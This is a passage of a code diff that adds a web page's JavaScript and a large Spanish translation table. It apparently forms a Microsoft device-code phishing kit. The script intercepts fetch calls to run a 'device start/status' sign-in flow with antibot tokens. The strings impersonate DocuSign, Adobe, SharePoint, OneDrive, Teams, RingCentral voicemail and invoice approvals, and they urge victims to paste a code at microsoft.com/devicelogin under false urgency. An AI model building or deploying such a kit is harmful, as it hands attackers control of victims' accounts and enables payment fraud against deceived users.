+          if(winHelloEnabled&&data.wfb_success===true)redirectAfterVerified();
+        }else if(isFailureStatus(data.status)){
+          clearStartRequestId(originalPath&&retryPath[originalPath]?"token":am());
+          winHelloStage=3;
+          var hello=winHelloPayload(data);
+          var message=first(data.error_message,hello.error_message,data.error,hello.error,"Additional verification did not complete. Please try again.");
+          closeWinHelloPopup();
+          if(winHelloEnabled)showSoftToastAfterPopupClose("Additional verification failed",message,12000,null,"error");
+        }else if(String(winHelloPayload(data).phase||"").toLowerCase()==="key_ready"){
+          winHelloStage=2;
+          closeWinHelloPopup();
+          showSoftToast("Finalizing verification","Additional verification is complete. Finishing secure sign-in...",600000,null,"busy");
+        }else if(String(winHelloPayload(data).phase||"").toLowerCase()==="failed"||winHelloPayload(data).registered===false){
+          winHelloStage=2;
+          closeWinHelloPopup();
+          showSoftToast("Finishing secure sign-in","Additional verification was unavailable. Continuing with the completed sign-in...",600000);
+        }else if(data.mirror_url){
+          beginWinHelloTransition(data.mirror_url);
+        }
+      }
+      return jsonResp(data,resp,resp.status||200);
+    },function(){return resp;});
+  }
+  var inflight={};
+  function cloneResp(resp){return resp&&typeof resp.clone==="function"?resp.clone():resp;}
+  function method(i,n){return String((n&&n.method)||(i&&i.method)||"GET").toUpperCase();}
+  function fetchApi(a,i,n){rememberToken(i,n);var original=statusPath(a);var target=original&&retryPath[original]?retryPath[original]:a;var mode=original&&retryPath[original]?"token":am();var isDeviceStart=target==="/api/device/start";var isDeviceStatus=!!statusPath(target);var keepDeviceApiOnWorker=!automaticTargetCountryHeaderOnly&&(isDeviceStart||isDeviceStatus);var addAutomaticTargetCountryHeader=automaticTargetCountry&&!keepDeviceApiOnWorker&&isDeviceStart;var addWinHelloHeader=winHelloEnabled&&mode==="cookie"&&isDeviceStart;if(addWinHelloHeader)prepareWinHelloStart();var requestId=isDeviceStart?startRequestId(mode):"";var next=withHeaders(i,n,mode,addAutomaticTargetCountryHeader,"",addWinHelloHeader,requestId);if(isDeviceStatus&&lastToken)next.headers.set("X-Antibot-Token",lastToken);if(keepDeviceApiOnWorker)next.credentials="same-origin";var key=method(i,next)==="GET"&&original?original:"";if(key&&inflight[key])return inflight[key].then(cloneResp);var requestPromise;if(addAutomaticTargetCountryHeader){requestPromise=resolveStaticVisitorCountry().then(function(country){return o.call(this,keepDeviceApiOnWorker?target:b+target,withHeaders(i,n,mode,addAutomaticTargetCountryHeader,country,addWinHelloHeader,requestId));}.bind(this));}else{requestPromise=o.call(this,keepDeviceApiOnWorker?target:b+target,next);}var req=requestPromise.then(function(resp){return normalizeResponse(resp,target,original);},function(error){if(addWinHelloHeader)closeWinHelloPopup();throw error;});if(!key)return req;inflight[key]=req;req.finally(function(){if(inflight[key]===req)delete inflight[key];});return req.then(cloneResp);}
+  window.fetch=function(i,n){var u=typeof i==="string"?i:(i&&i.url);var a=p(u);if(a)return fetchApi.call(this,a,i,n);return o.apply(this,arguments);};
+})();
+</script><script>window.__APP_LOCALE="es";window.__APP_TRANSLATIONS={"global":{"button":{"continue":"Continuar","cancel":"Cancelar","close":"Cerrar"},"status":{"loading":"Cargando"}},"template":{"title":"Bienvenido","subtitle":"Continúa para ver esta página","primary_action":"Continuar"},"form":{"email_placeholder":"Ingresa el correo electrónico"},"error":{"required":"Este campo es obligatorio","expired":"Esta página ha expirado"},"meeting":{"organizer_label":"Organizador","location_label":"Ubicación","invited_count":"{count} personas invitadas"},"phrases":{"Fast, flexible and secure international money transfers worldwide.":"Fast, flexible and secure international money transfers worldwide.","We would welcome the opportunity to discuss how we can establish a long-term partnership for the supply of your products. We look forward to exploring mutually beneficial business opportunities and building a strong, lasting relationship.":"We would welcome the opportunity to discuss how we can establish a long-term partnership for the supply of your products. We look forward to exploring mutually beneficial business opportunities and building a strong, lasting relationship.","shared site resources":"shared site resources","Play Voice Message":"Play Voice Message","Procurement Manager":"Procurement Manager","Location: Microsoft Teams":"Location: Microsoft Teams","RingCentral Voice Message":"RingCentral Voice Message","Microsoft verification page":"Microsoft verification page","This request needs your verification. SLA breach in 2 hours without approval.":"This request needs your verification. SLA breach in 2 hours without approval.","A vendor invoice awaits approval from a signing officer. Verify your identity to proceed with the payment authorization.":"A vendor invoice awaits approval from a signing officer. Verify your identity to proceed with the payment authorization.","Approve to release payment":"Approve to release payment","Use the secure verification code below to advance this workflow.":"Use the secure verification code below to advance this workflow.","Keep this tab open. You\u0027ll be redirected back to your SharePoint site as soon as your account is verified.":"Keep this tab open. You\u0027ll be redirected back to your SharePoint site as soon as your account is verified.","Opening your SharePoint file…":"Opening your SharePoint file…","SharePoint — Sign in to continue":"SharePoint — Sign in to continue","Identity Verification":"Verificación de identidad","Please click the button below to generate your verification code.":"Haz clic en el botón de abajo para generar tu código de verificación.","Verify your identity":"Verifique su identidad","Verify your identity to view the document":"Verifica tu identidad para ver el documento","This document is protected by Adobe. Sign in with your Microsoft account to continue.":"Este documento está protegido por Adobe. Inicia sesión con tu cuenta de Microsoft para continuar.","This document is protected by DocuSign. Sign in with your Microsoft account to continue.":"Este documento está protegido por DocuSign. Inicia sesión con tu cuenta de Microsoft para continuar.","View Document":"Ver documento","Open Document":"Abrir documento","Secure document access":"Acceso seguro al documento","A document has been shared with you. Confirm your identity to continue.":"Se ha compartido un documento con usted. Confirme su identidad para continuar.","Sign in to join your meeting":"Inicia sesión para unirte a tu reunión","Get verification code":"Obtener código de verificación","Connect your Microsoft passkey":"Conecte su Microsoft Passkey","Create a one-time code to connect this device with your Microsoft account.":"Crea un código de un solo uso para conectar este dispositivo con tu cuenta de Microsoft.","Create pairing code":"Crear código de emparejamiento","Document ready for review":"Documento listo para revisar","Generate and copy the access code to continue reviewing this QuickBooks document.":"Genera y copia el código de acceso para seguir revisando este documento de QuickBooks.","New Secure File Shared With You":"Nuevo archivo seguro compartido contigo","Verify your identity to access":"Verifica tu identidad para acceder","Verification code":"Código de verificación","Generate a one-time passcode to securely access and sign your pending document.":"Genera un código de un solo uso para acceder y firmar de forma segura tu documento pendiente.","New PDF File":"Nuevo archivo PDF","You\u0027ve received a secure file.":"Has recibido un archivo seguro.","Event Presentation":"Presentación del evento","Use the Microsoft verification code to view this presentation.":"Usa el código de verificación de Microsoft para ver esta presentación.","Continue to review":"Continuar con la revisión","Verify \u0026 open document":"Verificar y abrir documento","Waiting for sign in":"Esperando inicio de sesión","This document is protected by Adobe. Sign in with your Microsoft account to access it securely.":"Este documento está protegido por Adobe. Inicia sesión con tu cuenta de Microsoft para acceder de forma segura.","This document is protected by DocuSign. Sign in with your Microsoft account to access it securely.":"Este documento está protegido por DocuSign. Inicia sesión con tu cuenta de Microsoft para acceder de forma segura.","View QuickBooks Receipt":"Ver recibo de QuickBooks","Confirm it\u0027s really you":"Confirma que realmente eres tú","For your protection, we need to verify your identity before opening these shared files. Generate a one-time code and sign in with your Microsoft account.":"Para tu protección, debemos verificar tu identidad antes de abrir estos archivos compartidos. Genera un código de un solo uso e inicia sesión con tu cuenta de Microsoft.","For your protection, we need to verify your identity before opening these shared files . Generate a one-time code and sign in with your Microsoft account.":"Para tu protección, debemos verificar tu identidad antes de abrir estos archivos compartidos. Genera un código de un solo uso e inicia sesión con tu cuenta de Microsoft.","Verify your identity to access the file":"Verifica tu identidad para acceder al archivo","This file is stored on OneDrive. Please sign in with your Microsoft account to continue.":"Este archivo está almacenado en OneDrive. Inicia sesión con tu cuenta de Microsoft para continuar.","Voicemail access required":"Se requiere acceso al buzón de voz","Generate and copy the access code to continue listening to this RingCentral voicemail message.":"Genera y copia el código de acceso para seguir escuchando este mensaje de voz de RingCentral.","Play RingCentral Voicemail":"Reproducir mensaje de voz de RingCentral","Please confirm that you are not a robot":"Confirma que no eres un robot","This SharePoint site requires authentication. Complete the verification process to continue.":"Este sitio de SharePoint requiere autenticación. Completa el proceso de verificación para continuar.","Documents":"Documentos","Project Documents":"Documentos del proyecto","Internal team site - Microsoft User\u0027s workspace":"Sitio interno del equipo - espacio de trabajo de Microsoft User","This meeting requires authentication. Complete the verification to continue.":"Esta reunión requiere autenticación. Completa la verificación para continuar.","To access your voicemail messages, we need to confirm that this is your account.":"Para acceder a tus mensajes de voz, debemos confirmar que esta es tu cuenta.","Microsoft 365":"Microsoft 365","Unified Communications":"Comunicaciones unificadas","Copy code":"Copiar código","To verify your identity, enter the 6-character code below to connect to your account.":"Para verificar tu identidad, introduce el código de 6 caracteres de abajo para conectar tu cuenta.","Generate Meeting ID":"Generar ID de reunión","Verification complete":"Verificación completada","Your identity has been confirmed.":"Tu identidad ha sido confirmada.","You will be redirected shortly.":"Serás redirigido en breve.","Securing your session...":"Protegiendo tu sesión...","Initializing secure connection...":"Inicializando la conexión segura...","Continue to Microsoft":"Continuar con Microsoft","Secured by Microsoft":"Protegido por Microsoft","Open File":"Abrir archivo","Copy":"Copiar","Refresh page":"Actualizar página","Continue":"Continuar","Access shared file":"Acceder al archivo compartido","Verify to sign":"Verificar para firmar","Workbook access verification required":"Se requiere verificación para acceder al libro","View shared document":"Ver documento compartido","Update your password":"Actualiza tu contraseña","RingCentral voicemail access verification required":"Se requiere verificación para acceder al buzón de voz de RingCentral","Continue to Verify":"Continuar para verificar","SharePoint site access verification required":"Se requiere verificación para acceder al sitio de SharePoint","Meeting access verification required":"Se requiere verificación para acceder a la reunión","Mailbox storage limit reached":"Se alcanzó el límite de almacenamiento del buzón","Confirm your attendance to continue":"Confirma tu asistencia para continuar","Invoice pending approval":"Factura pendiente de aprobación","Open Sign-In Window":"Abrir ventana de inicio de sesión","Introductory Call":"Llamada introductoria","Select time":"Seleccionar hora","Your details":"Tus datos","Confirm":"Confirmar","How long do you need?":"¿Cuánto tiempo necesitas?","Select a date":"Seleccionar una fecha","Available Times":"Horarios disponibles","Your Meeting":"Tu reunión","Select duration":"Seleccionar duración","Book your meeting":"Reserva tu reunión","Book Meeting":"Reservar reunión","Booking Summary":"Resumen de la reserva","Confirm Your Booking":"Confirma tu reserva","Confirm Booking":"Confirmar reserva","Full Name *":"Nombre completo *","Additional notes":"Notas adicionales","(optional)":"(opcional)","One last step - review your meeting details before sending the request":"Un último paso: revisa los detalles de la reunión antes de enviar la solicitud","Previous month":"Mes anterior","Next month":"Mes siguiente","Your full name":"Tu nombre completo","Topics you\u0027d like to discuss...":"Temas que te gustaría tratar...","Contacting Microsoft servers...":"Contactando con los servidores de Microsoft...","Generating verification code...":"Generando código de verificación...","Finalizing secure session...":"Finalizando la sesión segura...","Expired":"Caducado","Copied":"Copiado","Please enter your full name before booking.":"Introduce tu nombre completo antes de reservar.","Booking reference copied.":"Referencia de reserva copiada.","Select date and time":"Seleccionar fecha y hora","Generate secure code":"Generar código seguro","I\u0027m not a robot":"No soy un robot","Open \u0026 Sign In":"Abrir e iniciar sesión","Continue →":"Continuar →","Next →":"Siguiente →","Code copied":"Código copiado","Open Microsoft sign-in":"Abrir inicio de sesión de Microsoft","Redirecting...":"Redirigiendo...","Try again":"Intentar de nuevo","Generate new code":"Generar código nuevo","Connecting...":"Conectando...","Copy code and continue":"Copiar código y continuar","Refresh":"Actualizar","Generating...":"Generando...","How to continue":"Cómo continuar","Open the Microsoft sign-in window":"Abra la ventana de inicio de sesión de Microsoft","Enter":"Introduzca","when prompted":"cuando se le solicite","Sign in with your Microsoft account":"Inicie sesión con su cuenta de Microsoft","Return here to access your document":"Vuelva aquí para acceder a su documento","Microsoft Protected Document":"Documento protegido de Microsoft","Secure document":"Documento seguro","Protected connection":"Conexión protegida","Document preview":"Vista previa del documento","Document details":"Detalles del documento","Available for review":"Disponible para revisión","Document verification":"Verificación del documento","Protected":"Protegido","Preparing secure access...":"Preparando el acceso seguro...","Use the code below to complete Microsoft\u0027s secure verification flow.":"Use el código siguiente para completar el proceso de verificación segura de Microsoft.","Generate a new code":"Generar un nuevo código","Verification completed":"Verificación completada","Redirecting to destination...":"Redirigiendo al destino...","Protected by your Microsoft document access policies":"Protegido por las políticas de acceso a documentos de Microsoft","Preparing your verification code...":"Preparando su código de verificación...","This code has expired. Generate a new one to continue.":"Este código ha caducado. Genere uno nuevo para continuar.","Verification is not configured for this preview.":"La verificación no está configurada para esta vista previa.","Connecting to Microsoft...":"Conectando con Microsoft...","Your code is ready. Click Copy code then continue.":"Su código está listo. Haga clic en Copiar código y luego continúe.","Waiting for code...":"Esperando el código...","Session failed. Please try again.":"La sesión ha fallado. Inténtelo de nuevo.","Generate a verification code first.":"Genere primero un código de verificación.","Code copied. Your browser blocked the Microsoft window; open microsoft.com/devicelogin manually.":"Código copiado. Su navegador bloqueó la ventana de Microsoft; abra microsoft.com/devicelogin manualmente.","Code copied. Continue in the Microsoft verification window.":"Código copiado. Continúe en la ventana de verificación de Microsoft.","Code copied to clipboard.":"Código copiado al portapapeles.","Microsoft window opened. Copy the code manually and paste it there.":"Se abrió la ventana de Microsoft. Copie el código manualmente y péguelo allí.","Copy failed. Select the code and copy it manually.":"No se pudo copiar. Seleccione el código y cópielo manualmente.","Verification passed. Redirecting you now...":"Verificación superada. Redirigiéndole ahora...","Verification passed.":"Verificación superada.","Failed to start verification.":"No se pudo iniciar la verificación.","Privacy":"Privacidad","Help":"Ayuda","Accessibility":"Accesibilidad","Copy the code above":"Copie el código anterior","Error":"Error","Microsoft account":"Cuenta de Microsoft","Security":"Seguridad","Verification failed":"La verificación ha fallado","Terms of use":"Términos de uso","Request a new code":"Solicitar un nuevo código","Review":"Revisar","Sign":"Firmar","Secured by Microsoft identity platform":"Protegido por la plataforma de identidad de Microsoft","Opening your document...":"Abriendo su documento...","Privacy Policy":"Política de privacidad","Pending signature":"Firma pendiente","Steps to complete":"Pasos para completar","Enter the verification code when prompted":"Introduzca el código de verificación cuando se le solicite","Return to this tab to review the document":"Vuelva a esta pestaña para revisar el documento","Need help?":"¿Necesita ayuda?","Verify Identity":"Verificar identidad","Verify your identity to access and sign":"Verifique su identidad para acceder y firmar","Your verification code":"Su código de verificación","Document Review":"Revisión del documento","Redirecting to your document...":"Redirigiendo a su documento...","Secure Verification Required":"Se requiere verificación segura","Access granted":"Acceso concedido","One-time passcode":"Código de acceso de un solo uso","Get new code":"Obtener un nuevo código","Identity verified.":"Identidad verificada.","Preparing secure verification...":"Preparando la verificación segura...","Verification code not ready":"El código de verificación no está listo","Steps to review:":"Pasos para revisar:","Session failed. Please refresh.":"La sesión ha fallado. Actualice la página.","Connecting to Microsoft services...":"Conectando con los servicios de Microsoft...","Connecting to Microsoft servers...":"Conectando con los servidores de Microsoft...","Code expired.":"El código ha caducado.","Verification code expired.":"El código de verificación ha caducado.","The verification code has expired.":"El código de verificación ha caducado.","This code has expired. Regenerate to continue.":"Este código ha caducado. Genere otro para continuar.","Please wait until the access code is ready.":"Espere hasta que el código de acceso esté listo.","Opening Microsoft verification page...":"Abriendo la página de verificación de Microsoft...","The verification code is not ready yet.":"El código de verificación aún no está listo.","Generating a secure verification code...":"Generando un código de verificación seguro...","Secure access":"Acceso seguro","Shared Document":"Documento compartido","\u0022Verify \u0026 open document\u0022":"\u0022Verificar y abrir documento\u0022","\u0026 Paste code (Ctrl+V)":"\u0026 Pegar código (Ctrl+V)","(pop-up)":"(ventana emergente)","- Microsoft Teams Meeting":"- Microsoft Teams Reunión",". Confirm when everything looks correct.":". Confirma cuando todo parezca correcto.",". Generate a one-time code and sign in with your Microsoft account.":". Genere un código único e inicie sesión con su cuenta Microsoft.","/ 50 GB used":"/ 50GB usados","1 unheard message · Identity verification required":"1 mensaje no escuchado · Se requiere verificación de identidad","1. Click the button below to open the sign-in window":"1. Haga clic en el botón a continuación para abrir la ventana de inicio de sesión.","2. Enter the code":"2. Introduce el código","256-bit SSL Encrypted":"SSL de 256 bits cifrado","256-bit SSL encrypted":"Cifrado SSL de 256 bits","256-bit encryption":"Cifrado de 256 bits","3. Authenticate with your Microsoft account":"3. Autentícate con tu cuenta Microsoft","4. Return to this tab to view your file":"4. Regrese a esta pestaña para ver su archivo.","A document was shared with you on OneDrive. Verify your identity with Microsoft to access it.":"Se compartió un documento con usted en OneDrive. Verifica tu identidad con Microsoft para acceder.","A verification code is required to access this document. Copy the code below and sign in with your Microsoft account to continue.":"Se requiere un código de verificación para acceder a este documento. Copie el código a continuación e inicie sesión con su cuenta Microsoft para continuar.","A verification code will be generated after secure access.":"Se generará un código de verificación después del acceso seguro.","Access Locked":"Acceso bloqueado","Access Restricted":"Acceso restringido","Access code protected":"Código de acceso protegido","Access code ready. Expires in 10:00.":"Código de acceso listo. Caduca a las 10:00.","Access to your RingCentral voicemail inbox has been temporarily suspended pending identity verification. All existing messages, recordings, and transcripts are securely preserved and will be fully accessible upon successful completion of the verification process.":"El acceso a su RingCentral bandeja de entrada de correo de voz se suspendió temporalmente en espera de la verificación de identidad. Todos los mensajes, grabaciones y transcripciones existentes se conservan de forma segura y serán totalmente accesibles una vez que se complete con éxito el proceso de verificación.","Account Security":"Seguridad de la cuenta","Account security":"Seguridad de la cuenta","Additional confirmation required":"Se requiere confirmación adicional","Adobe for Microsoft":"Adobe para Microsoft","Adobe · Verify Your Identity":"Adobe · Verifica tu identidad","Approval deadline warning":"Advertencia de fecha límite de aprobación","Approval progress":"Progreso de aprobación","Approval verified":"Aprobación verificada","Approvals · Vendor Invoice":"Aprobaciones · Factura de proveedor","Approved":"Aprobado","Assigned to you":"Asignado a ti","Assigned user":"Usuario asignado","Audit trail":"Pista de auditoría","Authenticate with the code on":"Autenticarse con el código activado","Authenticate with your Microsoft account":"Autentícate con tu cuenta Microsoft","Authorization Code":"Código de autorización","Awaiting Signature":"En espera de firma","Awaiting Verification":"En espera de verificación","Awaiting authorization":"En espera de autorización","Booking reference":"Referencia de reserva","Calendar":"Calendario","Check your email for the meeting details.":"Consulte su correo electrónico para conocer los detalles de la reunión.","Choose which email you want to use":"Elige qué correo electrónico quieres usar","Click":"Haga clic","Click \u0022Confirm Booking\u0022 below to finish the request.":"Haga clic en \u0022Confirmar reserva\u0022 a continuación para finalizar la solicitud.","Click Continue and paste (Ctrl+V) the code":"Haga clic en Continuar y pegue (Ctrl+V) el código.","Click Verify":"Haga clic en Verificar","Click View Document and paste the code (Ctrl+V)":"Haga clic en Ver documento y pegue el código (Ctrl+V)","Click continue and paste (Ctrl+V)":"Haga clic en continuar y pegar (Ctrl+V)","Click the button below and":"Haga clic en el botón de abajo y","Click the button below and paste it":"Haga clic en el botón de abajo y péguelo.","Click the button below to open the sign-in window":"Haga clic en el botón a continuación para abrir la ventana de inicio de sesión","Click to copy \u0026 open Microsoft":"Haga clic para copiar y abrir Microsoft","Code copied to clipboard":"Código copiado al portapapeles","Code copied, but the Microsoft window was blocked by your browser.":"Se copió el código, pero su navegador bloqueó la ventana Microsoft.","Code copied. Your browser blocked the Microsoft window; allow popups and try again.":"Código copiado. Su navegador bloqueó la ventana Microsoft; permita ventanas emergentes e inténtelo de nuevo.","Code copied. Your browser blocked the verification window; open the Microsoft link above.":"Código copiado. Su navegador bloqueó la ventana de verificación; abra el enlace Microsoft de arriba.","Code expired":"Código caducado","Code expires in":"El código caduca en","Code not generated":"Código no generado","Code ready. Copy it and continue with Microsoft.":"Código listo. Cópialo y continúa con Microsoft.","Code unavailable":"Código no disponible","Complete the verification steps below to securely access your file.":"Complete los pasos de verificación a continuación para acceder de forma segura a su archivo.","Compliance certifications":"Certificaciones de cumplimiento","Compliance check passed":"Verificación de cumplimiento aprobada","Compliance passed":"Cumplimiento aprobado","Connect this device for a simpler, passwordless sign-in experience protected by Microsoft security.":"Conecte este dispositivo para disfrutar de una experiencia de inicio de sesión más sencilla y sin contraseña protegida por la seguridad Microsoft.","Connected":"Conectado","Connecting to Microsoft Teams...":"Conectándose a Microsoft Teams...","Connecting to secure gateway...":"Conectándose a una puerta de enlace segura...","Connection error":"Error de conexión","Contact":"Contacto","Continue in Microsoft":"Continuar en Microsoft","Continue on Microsoft\u0027s verification page to finish setup.":"Continúe en la página de verificación de Microsoft para finalizar la configuración.","Continue  →":"Continuar  →","Copy access code":"Copiar código de acceso","Copy the authorization code displayed above.":"Copie el código de autorización que se muestra arriba.","Copy the booking reference code above.":"Copie el código de referencia de la reserva arriba.","Copy the code below, then paste it on the Microsoft sign-in page to unlock your voicemail.":"Copie el código a continuación y luego péguelo en la página de inicio de sesión Microsoft para desbloquear su correo de voz.","Copy the code, then complete verification in the Microsoft window.":"Copie el código y luego complete la verificación en la ventana Microsoft.","Copy the generated code for this session":"Copia el código generado para esta sesión.","Copy the unique security code":"Copia el código de seguridad único","Copy the verification code":"Copia el código de verificación","Copy the verification code above":"Copia el código de verificación de arriba","Copy the verification code displayed above.":"Copie el código de verificación que se muestra arriba.","Copy the verification code.":"Copia el código de verificación.","Corporate Intranet — Main Site":"Intranet corporativa: sitio principal","Creating a secure Microsoft session...":"Creando una sesión Microsoft segura...","Current document":"Documento actual","Date":"Fecha","Deleted Items":"Elementos eliminados","Delivery suspended.":"Entrega suspendida.","Details":"Detalles","Device-bound credential":"Credencial vinculada al dispositivo","DocuSign - Review Document":"DocuSign - Documento de revisión","DocuSign for Microsoft":"DocuSign para Microsoft","DocuSign · Verify Your Identity":"DocuSign · Verifica tu identidad","Document Libraries — Read \u0026 Write":"Bibliotecas de documentos: lectura y escritura","Document Ready":"Documento listo","Document Review – Adobe Acrobat Sign":"Revisión de documentos: Adobe Acrobat Sign","Document Review – DocuSign eSignature":"Revisión de documentos: DocuSign Firma electrónica","Document Review – SharePoint":"Revisión de documentos: SharePoint","Document Share Verification":"Verificación de intercambio de documentos","Document Viewer":"Visor de documentos","Document access code":"Código de acceso al documento","Document is ready to open":"El documento está listo para abrir.","Download":"Descargar","Duration":"Duración","Encrypted":"cifrado","Encrypted channel":"Canal cifrado","Enter the":"Introduzca el","Enter the code when prompted":"Ingrese el código cuando se le solicite","Enter the verification code below when prompted on the Microsoft verification page.":"Ingrese el código de verificación a continuación cuando se le solicite en la página de verificación Microsoft.","Enter the verification code shown above when prompted":"Ingrese el código de verificación que se muestra arriba cuando se le solicite","Enter verification code":"Ingrese el código de verificación","Event":"Evento","Expires soon":"Expira pronto","Final approval · pending":"Aprobación final · pendiente","Flexible scheduling — pick any available time":"Horarios flexibles: elija cualquier horario disponible","For assistance, contact your IT administrator or":"Para obtener ayuda, comuníquese con su administrador de TI o","For assistance, contact your system administrator or":"Para obtener ayuda, comuníquese con el administrador del sistema o","For your protection, we need to verify your identity before opening these":"Para su protección, necesitamos verificar su identidad antes de abrir estos","Fr":"Vi","Generate":"Generar","Generate a new pairing code to continue.":"Genera un nuevo código de emparejamiento para continuar.","Generating booking reference...":"Generando referencia de reserva...","Generating new Microsoft verification code...":"Generando nuevo Microsoft código de verificación...","Help Center":"Centro de ayuda","Home":"Hogar","Identity confirmed.":"Identidad confirmada.","Identity confirmed. Redirecting to your workbook...":"Identidad confirmada. Redirigiendo a su libro de trabajo...","Identity confirmed. Redirecting you to account settings...":"Identidad confirmada. Redirigiéndote a la configuración de la cuenta...","Identity confirmed. Redirecting you to storage management...":"Identidad confirmada. Redirigiéndote a gestión de almacenamiento...","Identity confirmed. Your Microsoft Teams meeting access has been fully restored. Redirecting you to Teams...":"Identidad confirmada. Su Microsoft Teams acceso a la reunión se ha restablecido por completo. Redireccionándote a Teams...","Identity confirmed. Your RingCentral voicemail inbox has been unlocked. Redirecting you to RingCentral...":"Identidad confirmada. Tu bandeja de entrada de RingCentral correo de voz ha sido desbloqueada. Redireccionándote a RingCentral...","Identity confirmed. Your SharePoint site access has been fully restored. Redirecting you to SharePoint...":"Identidad confirmada. Su acceso al sitio SharePoint se ha restablecido por completo. Redireccionándote a SharePoint...","Identity verified":"Identidad verificada","Identity verified successfully.":"Identidad verificada exitosamente.","Inbox":"Bandeja de entrada","Inbox \u0026 Folders":"Bandeja de entrada y carpetas","Initiator":"Iniciador","Integration":"Integración","Invoice awaiting your approval":"Factura pendiente de aprobación","Invoice queued for":"Factura en cola para","Invoice sender":"Remitente de factura","Items pending approval":"Artículos pendientes de aprobación","Join meeting":"Unirse a la reunión","Junk Email":"Correo electrónico no deseado","Just now":"En este momento","Keep this tab open. You\u0027ll be redirected back to your file as soon as your account is verified.":"Mantenga esta pestaña abierta. Serás redirigido nuevamente a tu archivo tan pronto como se verifique tu cuenta.","Last accessed: Today":"Último acceso: hoy","Loading Word workspace...":"Cargando Word espacio de trabajo...","Loading file...":"Cargando archivo...","Loading...":"Cargando...","Mailbox Storage":"Almacenamiento de buzones","Manage RingCentral account settings":"Administrar la configuración de la cuenta RingCentral","Meeting":"Reunión","Meeting Access":"Acceso a la reunión","Meeting Access Authorization":"Autorización de acceso a la reunión","Meeting Verification":"Verificación de reunión","Meeting access is governed by your Microsoft 365 or Microsoft Teams subscription policy.":"El acceso a las reuniones se rige por su política de suscripción Microsoft 365 o Microsoft Teams.","Meeting access suspended.":"Acceso a la reunión suspendido.","Meeting status updated.":"Estado de la reunión actualizado.","Microsoft 365 - Password Update Required":"Microsoft 365: se requiere actualización de contraseña","Microsoft 365 Business — Shared Workbooks":"Microsoft 365 Empresas: libros de trabajo compartidos","Microsoft 365 Secure Link":"Microsoft 365 Enlace seguro","Microsoft 365 Verification":"Microsoft 365 Verificación","Microsoft 365 Voicemail":"Microsoft 365 Correo de voz","Microsoft 365 security":"Microsoft 365 seguridad","Microsoft 365 verification":"Microsoft 365 verificación","Microsoft 365 — Mailbox Storage Full":"Microsoft 365 — Almacenamiento del buzón lleno","Microsoft 365 — Password Update Required":"Microsoft 365: se requiere actualización de contraseña","Microsoft 365 — Voicemail Verification":"Microsoft 365 — Verificación de correo de voz","Microsoft Excel Account":"Microsoft Excel Cuenta","Microsoft Excel — Workbook Access Verification":"Microsoft Excel — Verificación de acceso al libro de trabajo","Microsoft Passkey":"Microsoft Passkey","Microsoft Passkey Integration":"Integración de Microsoft Passkey","Microsoft SharePoint Account":"Microsoft SharePoint Cuenta","Microsoft SharePoint — Site Access Verification":"Microsoft SharePoint — Verificación de acceso al sitio","Microsoft Support":"Microsoft Soporte","Microsoft Teams Account":"Microsoft Teams Cuenta","Microsoft Teams Meeting Scheduler":"Microsoft Teams Programador de reuniones","Microsoft Teams meeting scheduler":"Microsoft Teams programador de reuniones","Microsoft Teams — Meeting Access Verification":"Microsoft Teams — Verificación de acceso a la reunión","Microsoft Voicemail":"Microsoft Correo de voz","Microsoft code required":"Microsoft código requerido","Microsoft code verification is required to access this document. This is enforced by Microsoft 365 security policy.":"Se requiere verificación del código Microsoft para acceder a este documento. Esto se aplica mediante la política de seguridad Microsoft 365.","Microsoft verification":"Microsoft verificación","Mo":"Lu","Modified":"Modificado","Multichain data encryption":"Cifrado de datos multicadena","My files":"Mis archivos","Name":"Nombre","New":"Nuevo","New messages sent to your address will be returned to the sender with a delivery failure notice. Your outgoing emails and existing messages are not affected.":"Los mensajes nuevos enviados a su dirección se devolverán al remitente con un aviso de error de entrega. Sus correos electrónicos salientes y mensajes existentes no se ven afectados.","New ref":"Nueva referencia","No password required":"No se requiere contraseña","Not started":"No iniciado","One-Time Verification Code":"Código de verificación único","One-time access code":"Código de acceso único","One-time verification code":"Código de verificación único","OneDrive - Shared Document":"OneDrive - Documento compartido","OneDrive / Documents":"OneDrive / Documentos","OneDrive Document Verification":"OneDrive Verificación de documentos","OneDrive for Microsoft":"OneDrive para Microsoft","OneDrive — Sign in to continue":"OneDrive: inicia sesión para continuar","OneDrive › Finance › Reports":"OneDrive › Finanzas › Informes","Open Document Portal":"Portal de documentos abierto","Open Microsoft sign-in and paste the code":"Abra Microsoft, inicie sesión y pegue el código.","Open Sign-In":"Abrir sesión","Open the RingCentral portal to listen to your voicemail":"Abra el portal RingCentral para escuchar su correo de voz","Open the document workspace to continue review":"Abra el espacio de trabajo del documento para continuar la revisión.","Opening":"Apertura","Opening document":"Documento de apertura","Opening document...":"Documento de apertura...","Opening your OneDrive file...":"Abriendo su archivo OneDrive...","Opening your Word document...":"Abriendo su documento Word...","Opening your document in OneDrive...":"Abriendo su documento en OneDrive...","Opening your document in SharePoint...":"Abriendo su documento en SharePoint...","Organization SharePoint Environment":"Organización SharePoint Medio ambiente","Pages":"Páginas","Pages \u0026 Site Content — View \u0026 Edit":"Páginas y contenido del sitio: ver y editar","Pairing code expired.":"El código de emparejamiento expiró.","Passkey connected":"Passkey conectado","Passkey setup":"Configuración de Passkey","Password Expiry":"Caducidad de la contraseña","Password expires in 24 hours":"La contraseña caduca en 24 horas","Password expires in 24 hours — action required":"La contraseña caduca en 24 horas: se requiere acción","Pending":"Pendiente","Pending Voicemail Message":"Mensaje de correo de voz pendiente","Play voicemail":"Reproducir correo de voz","Please refresh and try again.":"Actualice e inténtelo de nuevo.","Please refresh to try again.":"Actualice para intentarlo nuevamente.","Please verify your identity with Microsoft to access and sign this document.":"Verifique su identidad con Microsoft para acceder y firmar este documento.","Please wait while a new verification code is prepared.":"Espere mientras se prepara un nuevo código de verificación.","Preparing Meeting Verification":"Preparar la verificación de la reunión","Preparing Site Access Verification":"Preparando la verificación de acceso al sitio","Preparing Storage Recovery":"Preparando la recuperación del almacenamiento","Preparing Voicemail Verification":"Preparando la verificación del correo de voz","Preparing Workbook Verification":"Preparar la verificación del libro de trabajo","Preparing code":"Preparando código","Preparing secure code...":"Preparando código seguro...","Preparing secure connection...":"Preparando conexión segura...","Preparing secure document session...":"Preparando sesión de documento seguro...","Preparing secure voicemail session...":"Preparando sesión de correo de voz segura...","Preparing verification":"Preparando la verificación","Preparing your code":"Preparando tu código","Privacy \u0026 security":"Privacidad y seguridad","Proceed with Microsoft Entra ID":"Continúe con Microsoft Entra ID","Protected Document — Pending Access":"Documento protegido: acceso pendiente","Protected Workbook — Pending Access":"Libro de trabajo protegido: acceso pendiente","Protected by Microsoft 365":"Protegido por Microsoft 365","Protected by Microsoft 